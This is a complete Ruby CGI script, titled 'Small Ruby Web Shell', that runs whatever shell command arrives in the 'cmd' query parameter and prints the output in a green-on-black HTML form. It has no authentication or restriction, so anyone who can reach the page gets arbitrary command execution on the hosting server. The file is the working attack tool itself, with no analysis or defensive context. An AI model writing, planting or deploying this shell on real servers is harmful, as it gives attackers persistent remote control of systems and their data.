#!/usr/bin/env ruby
# frozen_string_literal: true

# Small Ruby Web Shell

require 'cgi'

print "Content-type: text/html\r\n\r\n"

cgi = CGI.new
html = DATA.read

if cgi["cmd"]
  output = %x(#{CGI.unescape(cgi['cmd'])}) rescue "Command error: #{cgi['cmd']}"
end

puts html % [File.basename($0), output]

__END__
<html>
<head>
  <meta charset="utf-8">
</head>
<body style="font-family: monospace; text-align: center">
  <form action="/cgi-bin/%s" method="get">
    <h1>Small Ruby Web Shell</h1>
    <input type="text" placeholder="ls -la" name="cmd">
    <input type="submit" value="Run">
  </form>
  <textarea readonly style="background-color: black; color: lime; width: 512; border: none; padding: 10px" rows="16">%s</textarea>
<body>
</html>
